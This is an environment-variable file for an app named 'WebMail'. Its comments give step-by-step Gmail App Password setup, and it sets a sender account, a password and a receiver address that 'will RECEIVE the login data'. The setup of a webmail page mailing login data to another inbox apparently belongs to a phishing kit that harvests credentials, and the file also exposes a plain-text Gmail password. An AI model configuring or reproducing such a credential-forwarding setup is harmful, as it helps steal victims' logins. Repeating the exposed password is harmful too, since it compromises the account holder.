# ─────────────────────────────────────────────────────────────────────────────
# WebMail – Environment Variables
# ─────────────────────────────────────────────────────────────────────────────
# STEP 1: Replace the values below with your real Gmail credentials.
#
# STEP 2: GMAIL_PASS must be a Google App Password (NOT your normal password).
#         To generate one:
#           1. Go to https://myaccount.google.com/security
#           2. Enable 2-Step Verification (if not already on)
#           3. Search "App passwords" in the search bar
#           4. Create a new app password → select "Mail" and your device
#           5. Copy the 16-character password and paste it below
# ─────────────────────────────────────────────────────────────────────────────

# The Gmail account used to SEND the notification email
GMAIL_USER=mw7473833@gmail.com

# Google App Password (16 characters, no spaces)
GMAIL_PASS=Godisinme1_1

# The Gmail account that will RECEIVE the login data
# (can be the same as GMAIL_USER, or a different address)
GMAIL_RECEIVER=beulahbest542@gmail.com

# Server port (optional – defaults to 3000)
PORT=3000
